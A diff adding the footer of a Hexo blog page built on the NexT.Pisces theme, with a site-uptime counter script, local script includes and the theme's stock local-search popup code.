+  <div class="theme-info">主题 &mdash; <a class="theme-link" target="_blank" href="https://github.com/iissnan/hexo-theme-next">NexT.Pisces</a> v5.1.4</div>
+
+-->
+<span id="sitetime"></span>
+<script language=javascript>
+	function siteTime(){
+		window.setTimeout("siteTime()", 1000);
+		var seconds = 1000;
+		var minutes = seconds * 60;
+		var hours = minutes * 60;
+		var days = hours * 24;
+		var years = days * 365;
+		var today = new Date();
+		var todayYear = today.getFullYear();
+		var todayMonth = today.getMonth()+1;
+		var todayDate = today.getDate();
+		var todayHour = today.getHours();
+		var todayMinute = today.getMinutes();
+		var todaySecond = today.getSeconds();
+		/* 
+		Date.UTC() -- 返回date对象距世界标准时间(UTC)1970年1月1日午夜之间的毫秒数(时间戳)
+		year - 作为date对象的年份，为4位年份值
+		month - 0-11之间的整数，做为date对象的月份
+		day - 1-31之间的整数，做为date对象的天数
+		hours - 0(午夜24点)-23之间的整数，做为date对象的小时数
+		minutes - 0-59之间的整数，做为date对象的分钟数
+		seconds - 0-59之间的整数，做为date对象的秒数
+		microseconds - 0-999之间的整数，做为date对象的毫秒数
+        */
+		var t1 = Date.UTC(2019,11,26,00,00,00); //北京时间2018-2-13 00:00:00
+		var t2 = Date.UTC(todayYear,todayMonth,todayDate,todayHour,todayMinute,todaySecond);
+		var diff = t2-t1;
+		var diffYears = Math.floor(diff/years);
+		var diffDays = Math.floor((diff/days)-diffYears*365);
+		var diffHours = Math.floor((diff-(diffYears*365+diffDays)*days)/hours);
+		var diffMinutes = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours)/minutes);
+		var diffSeconds = Math.floor((diff-(diffYears*365+diffDays)*days-diffHours*hours-diffMinutes*minutes)/seconds);
+		document.getElementById("sitetime").innerHTML=" 已运行"+/*diffYears+" 年 "+*/diffDays+" 天 "+diffHours+" 小时 "+diffMinutes+" 分钟 "+diffSeconds+" 秒";
+	}
+	siteTime();
+</script>
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/canvas-nest/canvas-nest.min.js"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    var isXml = true;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length === 0) {
+      search_path = "search.xml";
+    } else if (/json$/i.test(search_path)) {
+      isXml = false;
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    var onPopupClose = function (e) {
+      $('.popup').hide();
+      $('#local-search-input').val('');
+      $('.search-result-list').remove();
+      $('#no-result').remove();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    }
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.search-popup-overlay').click(onPopupClose);
+      $('.popup').toggle();
+      var $localSearchInput = $('#local-search-input');
+      $localSearchInput.attr("autocapitalize", "none");
+      $localSearchInput.attr("autocorrect", "off");
+      $localSearchInput.focus();
+    }
+
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+
+      // start loading animation
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay">' +
+          '<div id="search-loading-icon">' +
+          '<i class="fa fa-spinner fa-pulse fa-5x fa-fw"></i>' +
+          '</div>' +
+          '</div>')
+        .css('overflow', 'hidden');
+      $("#search-loading-icon").css('margin', '20% auto 0 auto').css('text-align', 'center');
+
+      $.ajax({
+        url: path,
+        dataType: isXml ? "xml" : "json",
+        async: true,
+        success: function(res) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = isXml ? $("entry", res).map(function() {
+            return {
+              title: $("title", this).text(),
+              content: $("content",this).text(),
+              url: $("url" , this).text()
+            };
+          }).get() : res;
+          var input = document.getElementById(search_id);
+          var resultContent = document.getElementById(content_id);
+          var inputEventFunction = function() {
+            var searchText = input.value.trim().toLowerCase();
+            var keywords = searchText.split(/[\s\-]+/);
+            if (keywords.length > 1) {
+              keywords.push(searchText);
+            }
+            var resultItems = [];
+            if (searchText.length > 0) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var hitCount = 0;
+                var searchTextCount = 0;
+                var title = data.title.trim();
+                var titleInLowerCase = title.toLowerCase();
+                var content = data.content.trim().replace(/<[^>]+>/g,"");
+                var contentInLowerCase = content.toLowerCase();
+                var articleUrl = decodeURIComponent(data.url);
+                var indexOfTitle = [];
+                var indexOfContent = [];
+                // only match articles with not empty titles
+                if(title != '') {
+                  keywords.forEach(function(keyword) {
+                    function getIndexByWord(word, text, caseSensitive) {
+                      var wordLen = word.length;
+                      if (wordLen === 0) {
+                        return [];
+                      }
+                      var startPosition = 0, position = [], index = [];
+                      if (!caseSensitive) {
+                        text = text.toLowerCase();
+                        word = word.toLowerCase();
+                      }
+                      while ((position = text.indexOf(word, startPosition)) > -1) {
+                        index.push({position: position, word: word});
+                        startPosition = position + wordLen;
+                      }
+                      return index;
+                    }
+
+                    indexOfTitle = indexOfTitle.concat(getIndexByWord(keyword, titleInLowerCase, false));
+                    indexOfContent = indexOfContent.concat(getIndexByWord(keyword, contentInLowerCase, false));
+                  });
+                  if (indexOfTitle.length > 0 || indexOfContent.length > 0) {
+                    isMatch = true;
+                    hitCount = indexOfTitle.length + indexOfContent.length;
+                  }
+                }
+
+                // show search results
+
+                if (isMatch) {
+                  // sort index by position of keyword
+
+                  [indexOfTitle, indexOfContent].forEach(function (index) {
+                    index.sort(function (itemLeft, itemRight) {
+                      if (itemRight.position !== itemLeft.position) {
+                        return itemRight.position - itemLeft.position;
+                      } else {
+                        return itemLeft.word.length - itemRight.word.length;
+                      }
+                    });
+                  });
+
+                  // merge hits into slices
+
+                  function mergeIntoSlice(text, start, end, index) {
+                    var item = index[index.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    var hits = [];
+                    var searchTextCountInSlice = 0;
+                    while (position + word.length <= end && index.length != 0) {
+                      if (word === searchText) {
+                        searchTextCountInSlice++;
+                      }
+                      hits.push({position: position, length: word.length});
+                      var wordEnd = position + word.length;
+
+                      // move to next position of hit
+
+                      index.pop();
+                      while (index.length != 0) {
+                        item = index[index.length - 1];
+                        position = item.position;
+                        word = item.word;
+                        if (wordEnd > position) {
+                          index.pop();
+                        } else {
+                          break;
+                        }
+                      }
+                    }
+                    searchTextCount += searchTextCountInSlice;
+                    return {
+                      hits: hits,
+                      start: start,
+                      end: end,
+                      searchTextCount: searchTextCountInSlice
+                    };
+                  }
+
+                  var slicesOfTitle = [];
+                  if (indexOfTitle.length != 0) {
+                    slicesOfTitle.push(mergeIntoSlice(title, 0, title.length, indexOfTitle));
+                  }
+
+                  var slicesOfContent = [];
+                  while (indexOfContent.length != 0) {
+                    var item = indexOfContent[indexOfContent.length - 1];
+                    var position = item.position;
+                    var word = item.word;
+                    // cut out 100 characters
+                    var start = position - 20;
+                    var end = position + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if (end < position + word.length) {
+                      end = position + word.length;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    slicesOfContent.push(mergeIntoSlice(content, start, end, indexOfContent));
+                  }
+
+                  // sort slices in content by search text's count and hits' count
+
+                  slicesOfContent.sort(function (sliceLeft, sliceRight) {
+                    if (sliceLeft.searchTextCount !== sliceRight.searchTextCount) {
+                      return sliceRight.searchTextCount - sliceLeft.searchTextCount;
+                    } else if (sliceLeft.hits.length !== sliceRight.hits.length) {
+                      return sliceRight.hits.length - sliceLeft.hits.length;
+                    } else {
+                      return sliceLeft.start - sliceRight.start;
+                    }
+                  });
+
+                  // select top N slices in content
+
+                  var upperBound = parseInt('1');
+                  if (upperBound >= 0) {
+                    slicesOfContent = slicesOfContent.slice(0, upperBound);
+                  }
+
+                  // highlight title and content
+
+                  function highlightKeyword(text, slice) {
+                    var result = '';
+                    var prevEnd = slice.start;
+                    slice.hits.forEach(function (hit) {
+                      result += text.substring(prevEnd, hit.position);
+                      var end = hit.position + hit.length;
+                      result += '<b class="search-keyword">' + text.substring(hit.position, end) + '</b>';
+                      prevEnd = end;
+                    });
+                    result += text.substring(prevEnd, slice.end);
+                    return result;
+                  }
+
+                  var resultItem = '';
+
+                  if (slicesOfTitle.length != 0) {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + highlightKeyword(title, slicesOfTitle[0]) + "</a>";
+                  } else {
+                    resultItem += "<li><a href='" + articleUrl + "' class='search-result-title'>" + title + "</a>";
+                  }
+
+                  slicesOfContent.forEach(function (slice) {
+                    resultItem += "<a href='" + articleUrl + "'>" +
+                      "<p class=\"search-result\">" + highlightKeyword(content, slice) +
+                      "...</p>" + "</a>";
+                  });
+
+                  resultItem += "</li>";
+                  resultItems.push({
+                    item: resultItem,
+                    searchTextCount: searchTextCount,
+                    hitCount: hitCount,
+                    id: resultItems.length
+                  });
+                }
+              })
+            };
+            if (keywords.length === 1 && keywords[0] === "") {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>'
+            } else if (resultItems.length === 0) {
+              resultContent.innerHTML = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>'
+            } else {
+              resultItems.sort(function (resultLeft, resultRight) {
+                if (resultLeft.searchTextCount !== resultRight.searchTextCount) {
+                  return resultRight.searchTextCount - resultLeft.searchTextCount;
+                } else if (resultLeft.hitCount !== resultRight.hitCount) {
+                  return resultRight.hitCount - resultLeft.hitCount;
+                } else {
+                  return resultRight.id - resultLeft.id;
+                }
+              });
+              var searchResultList = '<ul class=\"search-result-list\">';
+              resultItems.forEach(function (result) {
+                searchResultList += result.item;
+              })
+              searchResultList += "</ul>";
+              resultContent.innerHTML = searchResultList;
+            }
+          }
+
+          if ('auto' === 'auto') {
+            input.addEventListener('input', inputEventFunction);
+          } else {
+            $('.search-icon').click(inputEventFunction);
+            input.addEventListener('keypress', function (event) {
+              if (event.keyCode === 13) {
+                inputEventFunction();
+              }
+            });
+          }
+
+          // remove loading animation
+          $(".local-search-pop-overlay").remove();
+          $('body').css('overflow', '');
+
+          proceedsearch();
+        }
+      });
+    }
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched === false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(onPopupClose);
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+    $(document).on('keyup', function (event) {
+      var shouldDismissSearchPopup = event.which === 27 &&
+        $('.search-popup').is(':visible');
+      if (shouldDismissSearchPopup) {
+        onPopupClose();
+      }
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+
+  <!-- 页面点击小红心 -->
+  <script type="text/javascript" src="/js/src/love.js"></script>
+</body>
+</html>
